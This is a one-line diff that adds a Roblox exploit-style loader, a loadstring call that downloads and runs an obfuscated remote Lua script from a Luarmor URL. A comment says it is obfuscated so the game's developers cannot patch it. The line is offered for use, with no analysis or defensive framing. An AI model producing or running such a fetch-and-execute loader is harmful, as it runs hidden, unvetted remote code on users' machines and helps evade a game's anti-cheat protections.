@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/cfb882d60f991aa4a4bc26259ee5dbec.lua"))() -- obfuscated so people cant get this patched  obviously it will be soon the game is popular.
